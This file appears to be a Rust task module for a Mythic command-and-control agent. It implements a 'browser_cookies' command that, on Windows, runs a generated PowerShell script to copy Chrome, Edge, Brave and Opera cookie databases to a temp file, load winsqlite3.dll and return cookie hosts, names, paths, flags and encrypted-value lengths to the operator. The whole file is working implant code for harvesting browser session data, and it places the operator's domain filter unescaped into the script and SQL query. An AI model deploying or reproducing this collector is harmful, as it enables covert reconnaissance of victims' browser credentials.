use crate::{AgentTask, mythic_error, mythic_success};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize)]
struct BrowserCookiesArgs {
    browser: String,
    domain_filter: String,
}

pub fn browser_cookies(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    #[cfg(not(target_os = "windows"))]
    {
        return Ok(mythic_error!(
            task.id,
            "Browser cookie extraction is only supported on Windows"
        ));
    }

    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        let args: BrowserCookiesArgs = serde_json::from_str(&task.parameters)?;

        let browser = args.browser.as_str();
        let domain_filter = args.domain_filter.as_str();

        // Build PowerShell script to extract cookies from Chromium-based browsers
        let ps_script = format!(
            r#"
$browsers = @{{}}
if ("{browser}" -eq "all" -or "{browser}" -eq "chrome") {{ $browsers['chrome'] = "$env:LOCALAPPDATA\Google\Chrome\User Data" }}
if ("{browser}" -eq "all" -or "{browser}" -eq "edge") {{ $browsers['edge'] = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }}
if ("{browser}" -eq "all" -or "{browser}" -eq "brave") {{ $browsers['brave'] = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }}
if ("{browser}" -eq "all" -or "{browser}" -eq "opera") {{ $browsers['opera'] = "$env:APPDATA\Opera Software\Opera Stable" }}

$domainFilter = "{domain_filter}"
$allResults = @()

foreach ($bname in $browsers.Keys) {{
    $base = $browsers[$bname]
    $cookieDb = Join-Path $base "Default\Network\Cookies"
    if (-not (Test-Path $cookieDb)) {{ $cookieDb = Join-Path $base "Default\Cookies" }}
    if (-not (Test-Path $cookieDb)) {{ continue }}

    $tmp = Join-Path $env:TEMP "$($bname)_cookies_$(Get-Random).db"
    try {{ Copy-Item $cookieDb $tmp -Force -ErrorAction Stop }} catch {{ continue }}

    $query = "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, length(encrypted_value) as enc_len FROM cookies"
    if ($domainFilter) {{ $query += " WHERE host_key LIKE '%$domainFilter%'" }}
    $query += " LIMIT 200;"

    # Use winsqlite3.dll (ships with Windows 10+)
    try {{
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SQLite {{
    [DllImport("winsqlite3.dll")] public static extern int sqlite3_open(string filename, out IntPtr db);
    [DllImport("winsqlite3.dll")] public static extern int sqlite3_prepare_v2(IntPtr db, string sql, int nByte, out IntPtr stmt, IntPtr tail);
    [DllImport("winsqlite3.dll")] public static extern int sqlite3_step(IntPtr stmt);
    [DllImport("winsqlite3.dll")] public static extern IntPtr sqlite3_column_text(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll")] public static extern int sqlite3_column_int(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll")] public static extern long sqlite3_column_int64(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll")] public static extern int sqlite3_finalize(IntPtr stmt);
    [DllImport("winsqlite3.dll")] public static extern int sqlite3_close(IntPtr db);
}}
"@ -ErrorAction SilentlyContinue
    }} catch {{}}

    $db = [IntPtr]::Zero
    $rc = [SQLite]::sqlite3_open($tmp, [ref]$db)
    if ($rc -ne 0) {{ Remove-Item $tmp -Force -ErrorAction SilentlyContinue; continue }}

    $stmt = [IntPtr]::Zero
    $rc = [SQLite]::sqlite3_prepare_v2($db, $query, -1, [ref]$stmt, [IntPtr]::Zero)
    if ($rc -ne 0) {{ [SQLite]::sqlite3_close($db); Remove-Item $tmp -Force -ErrorAction SilentlyContinue; continue }}

    while ([SQLite]::sqlite3_step($stmt) -eq 100) {{
        $hostKey = [Runtime.InteropServices.Marshal]::PtrToStringAnsi([SQLite]::sqlite3_column_text($stmt, 0))
        $name = [Runtime.InteropServices.Marshal]::PtrToStringAnsi([SQLite]::sqlite3_column_text($stmt, 1))
        $path = [Runtime.InteropServices.Marshal]::PtrToStringAnsi([SQLite]::sqlite3_column_text($stmt, 2))
        $expires = [SQLite]::sqlite3_column_int64($stmt, 3)
        $secure = [SQLite]::sqlite3_column_int($stmt, 4)
        $httponly = [SQLite]::sqlite3_column_int($stmt, 5)
        $encLen = [SQLite]::sqlite3_column_int($stmt, 6)
        $allResults += @{{ browser=$bname; host_key=$hostKey; name=$name; path=$path; expires_utc=$expires; secure=$secure; httponly=$httponly; encrypted_value_length=$encLen }}
    }}

    [SQLite]::sqlite3_finalize($stmt)
    [SQLite]::sqlite3_close($db)
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
}}

if ($allResults.Count -eq 0) {{
    "No cookies found"
}} else {{
    $allResults | ConvertTo-Json -Depth 3 -Compress
}}
"#,
            browser = browser,
            domain_filter = domain_filter
        );

        let output = Command::new("powershell")
            .args(&["-NoProfile", "-NonInteractive", "-Command", &ps_script])
            .output()?;

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            if stdout.trim().is_empty() || stdout.trim() == "No cookies found" {
                Ok(mythic_success!(task.id, "No cookies found for the specified browser(s) and domain filter"))
            } else {
                Ok(mythic_success!(task.id, stdout))
            }
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            Ok(mythic_error!(
                task.id,
                format!("Failed to extract browser cookies: {}", stderr)
            ))
        }
    }
}
